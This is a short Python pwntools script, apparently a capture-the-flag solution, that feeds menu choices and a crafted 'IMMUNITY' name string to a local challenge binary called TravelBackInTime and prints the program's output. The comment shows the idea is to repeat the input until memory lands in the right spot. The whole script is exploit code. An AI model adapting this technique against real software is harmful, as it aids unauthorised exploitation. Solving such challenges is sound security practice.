from pwn import *

# Idea is to spam until the os finds the right spot !
pr = process('./TravelBackInTime')

scientist_name = "AAAAIMMUNITYIMMUNITYIMMUNITYAAAA"

pr.sendline(b"4")
pr.sendline(scientist_name.encode())
pr.sendline(b"6")
pr.sendline(b"1")
pr.sendline(b"")
pr.sendline(b"2")
pr.recvuntil(b'the journey begins', drop=True)
print(pr.recvline())
print(pr.recvline())
print(pr.recvline())